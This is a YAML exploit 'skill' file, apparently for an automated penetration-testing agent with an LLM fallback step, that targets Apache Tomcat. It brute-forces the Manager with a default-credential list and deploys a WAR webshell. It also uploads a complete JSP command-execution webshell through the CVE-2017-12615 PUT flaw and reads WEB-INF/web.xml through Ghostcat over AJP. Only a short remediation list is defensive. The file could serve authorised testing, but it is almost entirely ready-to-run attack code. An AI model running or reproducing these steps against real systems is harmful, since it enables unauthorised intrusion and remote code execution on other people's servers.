# ═══════════════════════════════════════════════════════════
# Apache Tomcat 综合利用 v2
#
# v2 修复:
#   - ENDPOINT 提取 base URL，避免双路径拼接
#   - 扩展弱口令凭据列表
#   - deploy_war 使用发现的凭据而非硬编码
# ═══════════════════════════════════════════════════════════
skill_id: tomcat_exploit
name: "Apache Tomcat 综合利用"
category: server_misconfig
version: "2.0"

principle: |
  Tomcat 的攻击面主要有三个方向:
  
  1. Manager 弱口令 + WAR 部署:
     /manager/html 是管理界面，使用 HTTP Basic 认证。
     默认凭据允许上传 WAR 包部署应用 → Webshell。
  
  2. PUT 方法上传（CVE-2017-12615）:
     readonly=false 时 PUT 方法可直接写 .jsp 文件。
  
  3. AJP Ghostcat（CVE-2020-1938）:
     AJP 协议读取 webapp 下任意文件。

match:
  rules:
    - fingerprint_contains: ["tomcat"]
    - fingerprint_contains: ["Apache Tomcat"]
    - evidence_contains: ["tomcat"]
    - cve_matches:
        - "CVE-2017-12615"
        - "CVE-2020-1938"

probes:
  - id: confirm_tomcat
    description: "确认 Tomcat 及版本"
    steps:
      - command: |
          BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
          echo "BASE_URL:$BASE"
          resp=$(curl -s -D - "$BASE/" --max-time 10 2>/dev/null)
          echo "$resp" | head -20
          if echo "$resp" | grep -qi "Apache Tomcat\|tomcat"; then
            echo "TOMCAT_CONFIRMED"
          fi
        parse_rules:
          - if_contains: ["TOMCAT_CONFIRMED"]
            set: { tomcat_confirmed: true }
          - if_contains: ["Apache Tomcat"]
            set: { tomcat_confirmed: true }

      - command: |
          BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
          code=$(curl -s "$BASE/manager/html" -o /dev/null -w "%{http_code}" --max-time 10 2>/dev/null)
          echo "MANAGER_STATUS:$code"
          if [ "$code" = "401" ]; then
            echo "MANAGER_EXISTS"
          fi
          if [ "$code" = "403" ]; then
            echo "MANAGER_EXISTS"
            echo "MANAGER_IP_RESTRICTED"
          fi
        parse_rules:
          - if_contains: ["MANAGER_EXISTS"]
            set: { manager_exists: true }
          - if_contains: ["MANAGER_IP_RESTRICTED"]
            set: { manager_ip_restricted: true }

  - id: check_put
    description: "检查 PUT 方法是否可用"
    depends_on: { tomcat_confirmed: true }
    command: |
      BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
      curl -s -X OPTIONS "$BASE/" -D - -o /dev/null --max-time 10 2>/dev/null
    parse_rules:
      - if_contains: ["PUT"]
        set: { put_allowed: true }

  - id: check_ajp
    description: "检查 AJP 端口（8009）是否开放"
    depends_on: { tomcat_confirmed: true }
    command: |
      timeout 5 bash -c "echo '' > /dev/tcp/{TARGET_IP}/8009" 2>/dev/null && echo "AJP_OPEN" || echo "AJP_CLOSED"
    parse_rules:
      - if_contains: ["AJP_OPEN"]
        set: { ajp_open: true }

exploit_paths:
  # ═══ 路径 A: Manager 弱口令 + WAR 部署 ═══
  - path_id: manager_weak_cred
    name: "Tomcat Manager 弱口令 + WAR 部署"
    priority: 1
    conditions:
      tomcat_confirmed: true
      manager_exists: true
    steps:
      - id: brute_manager
        description: "尝试常见凭据登录 Manager"
        command: |
          BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
          for cred in \
            tomcat:tomcat \
            admin:admin \
            tomcat:s3cret \
            admin:123456 \
            manager:manager \
            root:root \
            admin:admin123 \
            tomcat:changethis \
            admin:tomcat \
            tomcat:admin \
            admin:password \
            role1:tomcat \
            both:tomcat \
            admin: \
            tomcat: \
          ; do
            user=$(echo $cred | cut -d: -f1)
            pass=$(echo $cred | cut -d: -f2)
            resp=$(curl -s -u "${user}:${pass}" "$BASE/manager/text/list" --max-time 8 2>/dev/null)
            if echo "$resp" | grep -qi "OK - Listed applications\|^/"; then
              echo "CRED_FOUND:${user}:${pass}"
              echo "MANAGER_RESPONSE:$resp"
              break
            fi
          done
        timeout: 120
        success_criteria:
          stdout_contains_any: ["CRED_FOUND"]
        on_success: deploy_war
        on_fail: next_path

      - id: deploy_war
        description: "生成并部署 JSP Webshell WAR 包"
        command: |
          BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')

          # 创建 JSP webshell (base64 编码避免 YAML 转义问题)
          mkdir -p /tmp/warshell
          echo '' | base64 -d > /tmp/warshell/index.jsp
          cd /tmp && jar -cf warshell.war -C warshell/ .

          # 尝试所有已知凭据
          for cred in tomcat:tomcat admin:admin tomcat:s3cret admin:123456 manager:manager tomcat:changethis admin:tomcat admin:password; do
            user=$(echo $cred | cut -d: -f1)
            pass=$(echo $cred | cut -d: -f2)

            resp=$(curl -s -u "${user}:${pass}" --upload-file /tmp/warshell.war \
              "$BASE/manager/text/deploy?path=/warshell&update=true" \
              --max-time 15 2>/dev/null)
            echo "DEPLOY(${user}:${pass}): $resp"

            if echo "$resp" | grep -qi "OK - Deployed\|OK - Undeployed"; then
              sleep 2
              result=$(curl -s "$BASE/warshell/index.jsp?cmd=id" --max-time 10 2>/dev/null)
              echo "RCE_OUTPUT: $result"
              if echo "$result" | grep -q "uid="; then
                echo "TOMCAT_RCE_CONFIRMED"
              fi
              break
            fi
          done
        timeout: 60
        success_criteria:
          stdout_contains_any: ["uid=", "TOMCAT_RCE_CONFIRMED"]
        on_success: conclude_success
        on_fail: next_path
        evidence_capture:
          shell_type: "webshell_war"

  # ═══ 路径 B: PUT 上传 JSP ═══
  - path_id: put_upload
    name: "PUT 方法上传 JSP (CVE-2017-12615)"
    priority: 2
    conditions:
      tomcat_confirmed: true
    steps:
      - id: put_jsp_slash
        description: "PUT 上传 JSP（/file.jsp/ 绕过）"
        command: |
          BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
          curl -s -X PUT "$BASE/pentest_check.jsp/" \
            -d '<%out.println("PUT_RCE_OK");%>' \
            --max-time 10 2>/dev/null
          sleep 1
          curl -s "$BASE/pentest_check.jsp" --max-time 10 2>/dev/null
        timeout: 20
        success_criteria:
          stdout_contains_any: ["PUT_RCE_OK"]
        on_success: put_webshell
        on_fail: put_jsp_direct

      - id: put_jsp_direct
        description: "PUT 直接上传 JSP"
        command: |
          BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
          curl -s -X PUT "$BASE/pentest_check2.jsp" \
            -d '<%out.println("PUT_RCE_OK");%>' \
            --max-time 10 2>/dev/null
          sleep 1
          curl -s "$BASE/pentest_check2.jsp" --max-time 10 2>/dev/null
        timeout: 20
        success_criteria:
          stdout_contains_any: ["PUT_RCE_OK"]
        on_success: put_webshell
        on_fail: next_path

      - id: put_webshell
        description: "上传命令执行 Webshell 并验证"
        command: |
          BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
          curl -s -X PUT "$BASE/pentest_cmd.jsp/" \
            -d '<%@page import="java.util.*,java.io.*"%><%String c=request.getParameter("cmd");if(c!=null){Process p=Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",c});BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));String l;while((l=br.readLine())!=null)out.println(l);}%>' \
            --max-time 10 2>/dev/null
          sleep 1
          curl -s "$BASE/pentest_cmd.jsp?cmd=id" --max-time 10 2>/dev/null
        timeout: 20
        success_criteria:
          stdout_contains_any: ["uid="]
        on_success: conclude_success
        evidence_capture:
          shell_type: "webshell_put"

  # ═══ 路径 C: AJP Ghostcat ═══
  - path_id: ajp_ghostcat
    name: "AJP Ghostcat 文件读取"
    priority: 3
    conditions:
      tomcat_confirmed: true
      ajp_open: true
    steps:
      - id: ghostcat_read
        description: "通过 AJP 读取 WEB-INF/web.xml"
        command: |
          nmap -p 8009 --script ajp-request --script-args ajp-request.path=/WEB-INF/web.xml {TARGET_IP} 2>/dev/null
        timeout: 20
        success_criteria:
          stdout_contains_any: ["web-app", "servlet", "xml version"]
        on_success: conclude_success
        on_fail: next_path
        evidence_capture:
          shell_type: "file_read_ajp"

  # ═══ 路径 D: LLM 兜底 ═══
  - path_id: llm_freeform
    name: "LLM 自由推理"
    priority: 99
    mode: react_freeform
    max_rounds: 5
    conditions:
      tomcat_confirmed: true

remediation: |
  1. 修改或禁用 Manager 默认凭据，限制访问 IP
  2. 确保 conf/web.xml 中 DefaultServlet 的 readonly=true
  3. 如不需要 AJP，注释或删除 AJP Connector
  4. 保持 Tomcat 版本更新